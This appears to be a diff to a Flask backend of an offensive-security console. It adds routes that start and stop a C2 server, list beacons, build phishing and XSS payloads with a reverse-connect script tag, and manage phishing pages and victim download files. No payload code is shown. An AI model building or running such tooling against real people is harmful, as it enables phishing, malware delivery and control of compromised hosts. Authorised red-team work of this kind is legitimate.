@@ -196,11 +196,35 @@ def register(app):
         if not c2cfg["enabled"]:
             return jsonify({"ok": True, "enabled": False, "running": False,
                             "error": "C2 未启用(在 config.yaml 设置 c2.enabled: true 并配 project_root)"})
-        srv = c2_bridge.init_c2(c2cfg["project_root"], c2cfg["config_file"])
-        if not srv:
-            return jsonify({"ok": False, "enabled": True, "running": False, "error": c2_bridge.init_error()})
+        # 纯查询:不触发启动(手动停止后保持停止,由前端启动按钮显式拉起)
+        running = c2_bridge.c2_running()
+        if not running:
+            return jsonify({"ok": True, "enabled": True, "running": False,
+                            "error": c2_bridge.init_error() or "C2 已停止"})
         return jsonify({"ok": True, "enabled": True, "running": True,
                         "beacon_count": len(c2_bridge.list_beacons())})
+
+    @app.route("/api/c2/start", methods=["POST"])
+    @login_required
+    def c2_start():
+        config = load_yaml(app.config["CONFIG_PATH"])
+        c2cfg = _c2_config(config)
+        if not c2cfg["enabled"]:
+            return jsonify({"ok": False, "error": "C2 未启用"}), 400
+        ok, msg = c2_bridge.start_c2(c2cfg["project_root"], c2cfg["config_file"])
+        _c2_audit(app.config["get_redis"](), "start c2", msg)
+        return jsonify({"ok": ok, "running": ok, "message": msg})
+
+    @app.route("/api/c2/stop", methods=["POST"])
+    @login_required
+    def c2_stop():
+        config = load_yaml(app.config["CONFIG_PATH"])
+        c2cfg = _c2_config(config)
+        if not c2cfg["enabled"]:
+            return jsonify({"ok": False, "error": "C2 未启用"}), 400
+        ok, msg = c2_bridge.stop_c2()
+        _c2_audit(app.config["get_redis"](), "stop c2", msg)
+        return jsonify({"ok": ok, "running": not ok, "message": msg})
 
     @app.route("/api/c2/beacons")
     @login_required
@@ -399,12 +423,19 @@ def register(app):
     # ════════════════════ C2 工作台增强 API(2026-08) ════════════════════
 
     def _ensure_c2():
-        """启用检查 + 懒加载,返回 c2cfg 或 None。"""
+        """启用检查 + 懒加载,返回 c2cfg 或 None。
+
+        手动停止过(C2 已停止)时不自动拉起,返回 None——由前端启动按钮显式
+        /api/c2/start 恢复;其余场景(首次访问等)保持懒加载自动启动。
+        """
         config = load_yaml(app.config["CONFIG_PATH"])
         c2cfg = _c2_config(config)
         if not c2cfg["enabled"]:
             return None
-        c2_bridge.init_c2(c2cfg["project_root"], c2cfg["config_file"])
+        if c2_bridge.c2_running():
+            return c2cfg
+        if not c2_bridge.was_manual_stopped():
+            c2_bridge.init_c2(c2cfg["project_root"], c2cfg["config_file"])
         return c2cfg
 
     def _beacon_remark_key(bid: str) -> str:
@@ -592,9 +623,10 @@ def register(app):
         name = str(data.get("name", "") or "").strip()
         args = data.get("args") or {}
         host = str(data.get("host", "") or "").strip()
+        port = data.get("port")
         if not isinstance(args, dict):
             args = {}
-        res = phishing_bridge.build_payload(name, args, host=host)
+        res = phishing_bridge.build_payload(name, args, host=host, port=port)
         if not res.get("ok"):
             return jsonify({"ok": False, "error": res.get("error", "构建失败")}), 400
         # xss_payload 模块额外返回注入代码:script tag 直接加载目标反连模块(args.module)
@@ -603,7 +635,7 @@ def register(app):
             target = str(args.get("module") or "").strip() or "xss_payload"
             tag_args = dict(args)
             tag_args.pop("module", None)
-            tag_res = phishing_bridge.build_script_tag(target, tag_args, host=host)
+            tag_res = phishing_bridge.build_script_tag(target, tag_args, host=host, port=port)
         return jsonify({"ok": True, "code": res["code"], "script_tag": (tag_res or {}).get("tag", "")})
 
     @app.route("/api/phishing/pages")
@@ -631,11 +663,17 @@ def register(app):
             return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
         return jsonify({"ok": True, "files": phishing_bridge.list_page_files(name)})
 
-    @app.route("/api/phishing/page/<name>/file", methods=["GET", "POST"])
+    @app.route("/api/phishing/page/<name>/file", methods=["GET", "POST", "DELETE"])
     @login_required
     def phishing_page_file(name: str):
         if not _ensure_phishing():
             return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
+        if request.method == "DELETE":
+            file = str(request.args.get("path", "") or "").strip()
+            ok, msg = phishing_bridge.delete_page_file(name, file)
+            if ok:
+                _ph_audit(app.config["get_redis"](), f"page file delete {name}/{file}", msg)
+            return jsonify({"ok": ok, "message": msg})
         if request.method == "GET":
             file = str(request.args.get("path", "") or "").strip()
             content = phishing_bridge.read_page_file(name, file)
@@ -670,6 +708,63 @@ def register(app):
         ok, msg = phishing_bridge.delete_page(name)
         _ph_audit(app.config["get_redis"](), f"page delete {name}", msg)
         return jsonify({"ok": ok, "message": msg})
+
+    # ── 下载物管理(name ↔ path/url + UA 匹配)──
+
+    @app.route("/api/phishing/downloads")
+    @login_required
+    def phishing_downloads():
+        if not _ensure_phishing():
+            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
+        return jsonify(phishing_bridge.list_downloads())
+
+    @app.route("/api/phishing/downloads", methods=["POST"])
+    @login_required
+    def phishing_downloads_save():
+        if not _ensure_phishing():
+            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
+        data = request.get_json(silent=True) or {}
+        dls = data.get("downloads") or []
+        res = phishing_bridge.save_downloads(dls)
+        if res.get("ok"):
+            _ph_audit(app.config["get_redis"](),
+                      f"downloads save {len(dls)} 条", res.get("message", ""))
+        return jsonify(res)
+
+    # ── 共享下载目录文件(所有页面共用)──
+
+    @app.route("/api/phishing/downloads/files")
+    @login_required
+    def phishing_download_files():
+        if not _ensure_phishing():
+            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
+        return jsonify(phishing_bridge.list_download_files())
+
+    @app.route("/api/phishing/downloads/files", methods=["POST"])
+    @login_required
+    def phishing_download_files_upload():
+        if not _ensure_phishing():
+            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
+        data = request.get_json(silent=True) or {}
+        filename = str(data.get("filename", "") or "").strip()
+        content = str(data.get("content", "") or "")
+        res = phishing_bridge.write_download_file(filename, content)
+        if res.get("ok"):
+            _ph_audit(app.config["get_redis"](),
+                      f"downloads upload {filename}", res.get("message", ""))
+        return jsonify(res)
+
+    @app.route("/api/phishing/downloads/files", methods=["DELETE"])
+    @login_required
+    def phishing_download_files_delete():
+        if not _ensure_phishing():
+            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
+        filename = str(request.args.get("filename", "") or "").strip()
+        res = phishing_bridge.delete_download_file(filename)
+        if res.get("ok"):
+            _ph_audit(app.config["get_redis"](),
+                      f"downloads delete {filename}", res.get("message", ""))
+        return jsonify(res)
 
     @app.route("/api/phishing/module/add", methods=["POST"])
     @login_required
